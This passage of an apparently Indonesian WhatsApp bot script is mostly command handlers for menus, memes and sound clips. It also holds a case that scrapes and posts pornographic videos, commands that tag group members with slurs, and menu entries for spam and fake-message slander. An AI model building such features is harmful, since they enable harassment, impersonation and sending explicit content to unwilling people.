buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break
case 'othermenu':

        if(menusimpel == false){               
                const timestampi = speed();
					const latensyi = speed() - timestampi
              
				runtime = process.uptime()
				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = `*─❒ OTHER MENU*
_ダ ${prefix}cogan_ 
_ダ ${prefix}cecan_ 
_ダ ${prefix}meme_ 
_ダ ${prefix}darkjoke_
_ダ ${prefix}memeindo_
_ダ ${prefix}asupan_
_ダ ${prefix}quotes_
_ダ ${prefix}rate_
_ダ ${prefix}kapankah_
_ダ ${prefix}apakah_
_ダ ${prefix}bisakah_
_ダ ${prefix}caripesan [ _teks|jumlah_ ]_
_ダ ${prefix}slots_
_ダ ${prefix}suit [ _gunting/batu/kertas_ ]_
_ダ ${prefix}tag [ _nomor_ ]_
_ダ ${prefix}tagme_
_ダ ${prefix}tts [ _kodebhs teks_ ]_
_ダ ${prefix}readmore [ _teks1|teks2_ ]_
_ダ ${prefix}fitnahpc [ _nomor|teks1|teks2_ ]_
_ダ ${prefix}chat [ _nomor|teks_ ]_
_ダ ${prefix}fdeface [ _replyimg link|teks1|teks2_ ]_
_ダ ${prefix}listgrup_
_ダ ${prefix}baileys [ _reply message_ ]_
_ダ ${prefix}q [ _reply message_ ]_
_ダ ${prefix}getcaption [ _reply message_ ]_
_ダ ${prefix}tospam [ _reply audio/sticker/image|jumlah_ ]_
_ダ ${prefix}sharelock [ _teks1|teks2_ ]_
        
       
 `
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`menu`,buttonText:{displayText:'BACK TO MENU'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break
case 'bokep':
try{
               
boks = Date.now();
bok = await scrapper.pornvid()
bokt = `BOKEP

┬╗ Judul    : ${bok.hasil.title}
┬╗ Upload   : ${bok.hasil.upload}
┬╗ Views    : ${bok.hasil.views}
┬╗ Like     : ${bok.hasil.like}
┬╗ Dislike  : ${bok.hasil.dislike}
┬╗ Favorite : ${bok.hasil.favorite}
┬╗ Tag      : ${bok.hasil.tags}
┬╗ Source   : ${bok.hasil.source}`

sendMediaURL(from, "https://tikporntok.com/"+bok.hasil.thumb, bokt)
sendMediaURL(from, "https://tikporntok.com/"+bok.hasil.video, monospace(`Process ${((Date.now()-boks)/1000).toFixed(1)} Seconds`))
} catch (e){
console.log(e)
reply(e)
}
break


case 'meme':

              buff = await getBuffer(`https://api.lolhuman.xyz/api/random/meme?apikey=${lolkey}`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await Fan.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'_𝐅𝐚𝐧 𝐗7_', imageMessage: imageMsg,
              contentText:`Nih Om`,buttons,headerType:4}
              prep = await Fan.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              Fan.relayWAMessage(prep)
                    break
case 'darkjoke':
case 'memeindo':
  ini_txt = `*MAAF BOT INI HANYA BISA DI AKSES DI GRUP*
SEWABOT UNTUK AKSES BOT
KETIK .store
DAN PILIH YANG MAU DI BELI
ATAU MASUK KE GRUP DIBAWAH 
JIKA MAU GRATIS
JOIN GRUP
GC 1: https://chat.whatsapp.com/K8V89lh8XFDBgkkZxa59tw`
              if(!isGroup)return reply(ini_txt)
              buff = await getBuffer(`https://api.lolhuman.xyz/api/meme/${command}?apikey=${lolkey}`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await Fan.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'_𝐅𝐚𝐧 𝐗7_', imageMessage: imageMsg,
              contentText:`Nih Om`,buttons,headerType:4}
              prep = await Fan.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              Fan.relayWAMessage(prep)
                    break

case 'info':
  
       var groups = Fan.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = Fan.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
         if(menusimpel == false){               
               const totalChat = await Fan.chats.all()
                 const timestampi = speed();
					const latensyi = speed() - timestampi                
				runtime = process.uptime()				
                nomor = 1
                stod = `${sender}`
       stst = await Fan.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
				
       
       menu = `『 BOT INFO 』

_ℒ⃝⛱️ Total Chat : ${totalChat.length}_
_ℒ⃝🗺️ Group Chat : ${groups.length}_
_ℒ⃝💬 Private Chat : ${privat.length}_
_ℒ⃝♍ MNC : 001_
_ℒ⃝♏ MCC : 510_
_ℒ⃝🌐 Platfrom : ${os.platform()}_
_ℒ⃝📳 Mode : ${publik ? 'Public' : 'Self'}_
_ℒ⃝☢️ Prefix : ${multi ? 'Multi Prefix' : 'No Prefix'}_
_ℒ⃝👨‍💻 Name Creator : 𝐅𝐚𝐧 𝐗7

*BOT INI MENGGUNAKAN*
JASA HOSTING BOT
_© Xavhier ゑ_
`
sendButLocation(from, `${menu}`, "*_© Xavhier ゑ_*", {jpegThumbnail:ofrply1,name:""}, [{buttonId:`store`,buttonText:{displayText:'STORE BOT'},type:1},{buttonId:`speed`,buttonText:{displayText:'SPEED BOT'},type:1}], {contextInfo: { mentionedJid: [dtod,otod,stod]}})
}
else if(menusimpel = true){
        stod = `${sender}`
fill =`Ohayoo ${pushname}, ${tampilUcapan}
Silahkan Pilih Untuk Menampilkan Menu

Jika Button Tidak Muncul Ketik .allmenu`
menu =` Xavhier ゑ`
gbutsan = [
{buttonId:`allmenu`,buttonText:{displayText:'SHOW MENU'},type:1},
{buttonId:`store`,buttonText:{displayText:'STORE MENU'},type:1},
{buttonId:`script`,buttonText:{displayText:'SEWABOT'},type:1}
]
mhan = await Fan.prepareMessage(from, ofrply, image, {thumbnail: ofrply})
const btnmenu = {
imageMessage: mhan.message.imageMessage,
contentText: `${fill}`,
footerText: `${menu}`,
buttons: gbutsan,
headerType: 4
}
Fan.sendMessage(from, btnmenu, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdreply": {
"title": `hallo ${pushname}` ,
"body": `${jmn} - ${week} ${weton} - ${calender}`,
"mediaType": "2",
"thumbnail": pporigi,
},mentionedJid:[stod]}, quoted : ftrol})
}
break
         case 'sound1':
         const sound1 = fs.readFileSync('./P1/audio/sound1.mp3')
         Fan.sendMessage(from, sound1, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound2':
         const suu = fs.readFileSync('./P1/audio/sound2.mp3')
         Fan.sendMessage(from, suu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: -2, ptt:true})
         break 
         case 'sound3':
         const sound3 = fs.readFileSync('./P1/audio/sound3.mp3')
         Fan.sendMessage(from, sound3, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound4':
         const sound4 = fs.readFileSync('./P1/audio/sound4.mp3')
         Fan.sendMessage(from, sound4, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound5':
         const sound5 = fs.readFileSync('./P1/audio/sound5.mp3')
         Fan.sendMessage(from, sound5, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound6':
         const sound6 = fs.readFileSync('./P1/audio/sound6.mp3')
         Fan.sendMessage(from, sound6, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break 
         case 'sound7':
         const sound7 = fs.readFileSync('./P1/audio/sound7.mp3')
         Fan.sendMessage(from, sound7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound8':
         const sound8 = fs.readFileSync('./P1/audio/sound8.mp3')
         Fan.sendMessage(from, sound8, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound9':
         const sound9 = fs.readFileSync('./P1/audio/sound9.mp3')
         Fan.sendMessage(from, sound9, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound10':
         const sound10 = fs.readFileSync('./P1/audio/sound10.mp3')
         Fan.sendMessage(from, sound10, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound11':
         const sound11 = fs.readFileSync('./P1/audio/sound11.mp3')
         Fan.sendMessage(from, sound11, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound12':
         const sound12 = fs.readFileSync('./P1/audio/sound12.mp3')
         Fan.sendMessage(from, sound12, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound13':
         const sound13 = fs.readFileSync('./P1/audio/sound13.mp3')
         Fan.sendMessage(from, sound13, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound14':
         const sound14 = fs.readFileSync('./P1/audio/sound14.mp3')
         Fan.sendMessage(from, sound14, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound15':
         const sound15 = fs.readFileSync('./P1/audio/sound15.mp3')
         Fan.sendMessage(from, sound15, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound16':
         const sound16 = fs.readFileSync('./P1/audio/sound16.mp3')
         Fan.sendMessage(from, sound16, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound17':
         const sound17 = fs.readFileSync('./P1/audio/sound17.mp3')
         Fan.sendMessage(from, sound17, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound18':
         const sound18 = fs.readFileSync('./P1/audio/sound18.mp3')
         Fan.sendMessage(from, sound18, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound19':
         const sound19 = fs.readFileSync('./P1/audio/sound19.mp3')
         Fan.sendMessage(from, sound19, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound20':
         const sound20 = fs.readFileSync('./P1/audio/sound20.mp3')
         Fan.sendMessage(from, sound20, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound21':
         const sound21 = fs.readFileSync('./P1/audio/sound21.mp3')
         Fan.sendMessage(from, sound21, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound22':
         const sound22 = fs.readFileSync('./P1/audio/sound22.mp3')
         Fan.sendMessage(from, sound22, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound23':
         const sound23 = fs.readFileSync('./P1/audio/sound23.mp3')
         Fan.sendMessage(from, sound23, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound24':
         const sound24 = fs.readFileSync('./P1/audio/sound24.mp3')
         Fan.sendMessage(from, sound24, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound25':
         const sound25 = fs.readFileSync('./P1/audio/sound25.mp3')
         Fan.sendMessage(from, sound25, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound26':
         const sound26 = fs.readFileSync('./P1/audio/sound26.mp3')
         Fan.sendMessage(from, sound26, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound27':
         const sound27 = fs.readFileSync('./P1/audio/sound27.mp3')
         Fan.sendMessage(from, sound27, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound28':
         const sound28 = fs.readFileSync('./P1/audio/sound28.mp3')
         Fan.sendMessage(from, sound28, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break         
         case 'sound29':
         const sound29 = fs.readFileSync('./P1/audio/sound29.mp3')
         Fan.sendMessage(from, sound29, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound30':
         const sound30 = fs.readFileSync('./P1/audio/sound30.mp3')
         Fan.sendMessage(from, sound30, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound31':
         const sound31 = fs.readFileSync('./P1/audio/sound31.mp3')
         Fan.sendMessage(from, sound31, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break 
         case 'sound32':
         const soundbabi = fs.readFileSync('./P1/audio/sound32.mp3')
         Fan.sendMessage(from, soundbabi, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound33':
         const soundmemek = fs.readFileSync('./P1/audio/sound33.mp3')
         Fan.sendMessage(from, soundmemek, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound34':
         const soundkontol = fs.readFileSync('./P1/audio/sound34.mp3')
         Fan.sendMessage(from, soundkontol, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break 
         case 'sound35':
         const soundenak = fs.readFileSync('./P1/audio/sound35.mp3')
         Fan.sendMessage(from, soundenak, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound36':
         const sound36 = fs.readFileSync('./P1/audio/sound36.mp3')
         Fan.sendMessage(from, sound36, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break  
         case 'sound37':
         const sound37 = fs.readFileSync('./P1/audio/sound37.mp3')
         Fan.sendMessage(from, sound37, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break          
         case 'sound38':
         const sound38 = fs.readFileSync('./P1/audio/sound38.mp3')
         Fan.sendMessage(from, sound38, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound39':
         const sound39 = fs.readFileSync('./P1/audio/sound39.mp3')
         Fan.sendMessage(from, sound39, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound40':
         const sound40 = fs.readFileSync('./P1/audio/sound40.mp3')
         Fan.sendMessage(from, sound40, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break 
         case 'sound41':
         const sound41 = fs.readFileSync('./P1/audio/sound41.mp3')
         Fan.sendMessage(from, sound41, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound42':
         const sound42 = fs.readFileSync('./P1/audio/sound42.mp3')
         Fan.sendMessage(from, sound42, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound43':
         const sound43 = fs.readFileSync('./P1/audio/sound43.mp3')
         Fan.sendMessage(from, sound43, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound44':
         const sound44 = fs.readFileSync('./P1/audio/sound44.mp3')
         Fan.sendMessage(from, sound44, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound45':
         const sound45 = fs.readFileSync('./P1/audio/sound45.mp3')
         Fan.sendMessage(from, sound45, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound46':
         const sound46 = fs.readFileSync('./P1/audio/sound46.mp3')
         Fan.sendMessage(from, sound46, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound47':
         const sound47 = fs.readFileSync('./P1/audio/sound47.mp3')
         Fan.sendMessage(from, sound47, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound48':
         const sound48 = fs.readFileSync('./P1/audio/sound48.mp3')
         Fan.sendMessage(from, sound48, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound49':
         const sound49 = fs.readFileSync('./P1/audio/sound49.mp3')
         Fan.sendMessage(from, sound49, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound50':
         const sound50 = fs.readFileSync('./P1/audio/sound50.mp3')
         Fan.sendMessage(from, sound50, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound51':
         const sound51 = fs.readFileSync('./P1/audio/sound51.mp3')
         Fan.sendMessage(from, sound51, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound52':
         const sound52 = fs.readFileSync('./P1/audio/sound52.mp3')
         Fan.sendMessage(from, sound52, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound53':
         const sound53 = fs.readFileSync('./P1/audio/sound53.mp3')
         Fan.sendMessage(from, sound53, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound54':
         const sound54 = fs.readFileSync('./P1/audio/sound54.mp3')
         Fan.sendMessage(from, sound54, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound55':
         const sound55 = fs.readFileSync('./P1/audio/sound55.mp3')
         Fan.sendMessage(from, sound55, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break       
         case 'sound56':
         const sound56 = fs.readFileSync('./P1/audio/sound56.mp3')
         Fan.sendMessage(from, sound56, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound57':
         const sound57 = fs.readFileSync('./P1/audio/sound57.mp3')
         Fan.sendMessage(from, sound57, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound58':
         const sound58 = fs.readFileSync('./P1/audio/sound58.mp3')
         Fan.sendMessage(from, sound58, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound59':
         const sound59 = fs.readFileSync('./P1/audio/sound59.mp3')
         Fan.sendMessage(from, sound59, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound60':
         const sound60 = fs.readFileSync('./P1/audio/sound60.mp3')
         Fan.sendMessage(from, sound60, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound61':
         const sound61 = fs.readFileSync('./P1/audio/sound61.mp3')
         Fan.sendMessage(from, sound61, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound62':
         const sound62 = fs.readFileSync('./P1/audio/sound62.mp3')
         Fan.sendMessage(from, sound62, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound63':
         const sound63 = fs.readFileSync('./P1/audio/sound63.mp3')
         Fan.sendMessage(from, sound63, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound64':
         const sound64 = fs.readFileSync('./P1/audio/sound64.mp3')
         Fan.sendMessage(from, sound64, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound65':
         const sound65 = fs.readFileSync('./P1/audio/sound65.mp3')
         Fan.sendMessage(from, sound65, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound66':
         const sound66 = fs.readFileSync('./P1/audio/sound66.mp3')
         Fan.sendMessage(from, sound66, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound67':
         const sound67 = fs.readFileSync('./P1/audio/sound67.mp3')
         Fan.sendMessage(from, sound67, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break 
         case 'sound68':
         const asu = fs.readFileSync('./P1/audio/sound68.mp3')
         Fan.sendMessage(from, asu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound69':
         const sound69 = fs.readFileSync('./P1/audio/sound69.mp3')
         Fan.sendMessage(from, sound69, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound70':
         const sound70 = fs.readFileSync('./P1/audio/sound70.mp3')
         Fan.sendMessage(from, sound70, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break         
         case 'sound71':
         const sound71 = fs.readFileSync('./P1/audio/sound71.mp3')
         Fan.sendMessage(from, sound71, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound72':
         const sound72 = fs.readFileSync('./P1/audio/sound72.mp3')
         Fan.sendMessage(from, sound72, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound73':
         const sound73 = fs.readFileSync('./P1/audio/sound73.mp3')
         Fan.sendMessage(from, sound73, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound74':
         const sound74 = fs.readFileSync('./P1/audio/sound74.mp3')
         Fan.sendMessage(from, sound74, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound75':
         const sound75 = fs.readFileSync('./P1/audio/sound75.mp3')
         Fan.sendMessage(from, sound75, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound76':
         const sound76 = fs.readFileSync('./P1/audio/sound76.mp3')
         Fan.sendMessage(from, sound76, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound77':
         const sound77 = fs.readFileSync('./P1/audio/sound77.mp3')
         Fan.sendMessage(from, sound77, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound78':
         const sound78 = fs.readFileSync('./P1/audio/sound78.mp3')
         Fan.sendMessage(from, sound78, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound79':
         const sound79 = fs.readFileSync('./P1/audio/sound79.mp3');
         Fan.sendMessage(from, sound79, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound80':
         const sound80 = fs.readFileSync('./P1/audio/sound80.mp3')
         Fan.sendMessage(from, sound80, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound81':
         const sound81 = fs.readFileSync('./P1/audio/sound81.mp3')
         Fan.sendMessage(from, sound81, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound82':
         const sound82 = fs.readFileSync('./P1/audio/sound82.mp3')
         Fan.sendMessage(from, sound82, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound83':
         const sound83 = fs.readFileSync('./P1/audio/sound83.mp3')
         Fan.sendMessage(from, sound83, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound84':
         const sound84 = fs.readFileSync('./P1/audio/sound84.mp3')
         Fan.sendMessage(from, sound84, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound85':
         const sound85 = fs.readFileSync('./P1/audio/sound85.mp3')
         Fan.sendMessage(from, sound85, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound86':
         const sound86 = fs.readFileSync('./P1/audio/sound86.mp3')
         Fan.sendMessage(from, sound86, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound87':
         const sound87 = fs.readFileSync('./P1/audio/sound87.mp3')
         Fan.sendMessage(from, sound87, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound88':
         const sound88 = fs.readFileSync('./P1/audio/sound88.mp3')
         Fan.sendMessage(from, sound88, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound89':
         const sound89 = fs.readFileSync('./P1/audio/sound89.mp3')
         Fan.sendMessage(from, sound89, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound90':
         const sound90 = fs.readFileSync('./P1/audio/sound90.mp3')
         Fan.sendMessage(from, sound90, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound91':
         const sound91 = fs.readFileSync('./P1/audio/sound91.mp3')
         Fan.sendMessage(from, sound91, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound92':
         const sound92 = fs.readFileSync('./P1/audio/sound92.mp3')
         Fan.sendMessage(from, sound92, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound93':
         const sound93 = fs.readFileSync('./P1/audio/sound93.mp3')
         Fan.sendMessage(from, sound93, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound94':
         const sound94 = fs.readFileSync('./P1/audio/sound94.mp3')
         Fan.sendMessage(from, sound94, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound95':
         const sound95 = fs.readFileSync('./P1/audio/sound95.mp3')
         Fan.sendMessage(from, sound95, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound96':
         const sound96 = fs.readFileSync('./P1/audio/sound96.mp3')
         Fan.sendMessage(from, sound96, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound97':
         const sound97 = fs.readFileSync('./P1/audio/sound97.mp3')
         Fan.sendMessage(from, sound97, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound98':
         const sound98 = fs.readFileSync('./P1/audio/sound98.mp3')
         Fan.sendMessage(from, sound98, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound99':
         const sound99 = fs.readFileSync('./P1/audio/sound99.mp3')
         Fan.sendMessage(from, sound99, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break
         case 'sound100':
         const sound100 = fs.readFileSync('./P1/audio/sound100.mp3')
         Fan.sendMessage(from, sound100, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
         break                                        
case 'bego':
      case 'tolol':
      case 'pinter':
      case 'pintar':
      case 'asu':
      case 'bodoh':
      case 'gay':
      case 'lesby':
      case 'bajingan':
      case 'jancok':
      case 'anjing':
      case 'ngentod':
      case 'ngentot':
      case 'monyet':
      case 'mastah':
      case 'newbie':
      case 'bangsat':
      case 'bangke':
      case 'sange':
      case 'sangean':
      case 'dakjal':
      case 'horny':
      case 'wibu':
      case 'puki':
      case 'pantex':
      case 'pantek':
      
      if (!isGroup) return reply(mess.only.group)  
        teks = `*Yang Paling ${command} Disini Adalah :* @${goo.jid.split('@')[0]} Damsarr ${command}`
        membr.push(goo.jid)
        mentions(teks, membr, true)
        break

        case 'store':
        stod = `${sender}`
 listMsg = {
